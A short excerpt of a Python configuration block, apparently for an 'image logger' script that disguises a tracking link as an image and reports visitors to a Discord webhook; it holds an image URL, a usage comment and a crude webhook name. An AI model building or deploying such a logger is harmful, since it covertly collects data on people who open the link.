...
config = {
    ...
    "image": "https://cdn.upload.systems/uploads/N9m7Rz5V.png", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)

    # CUSTOMIZATION #
    "username": "Fucked Baby", # Set this to the name you want the webhook to have
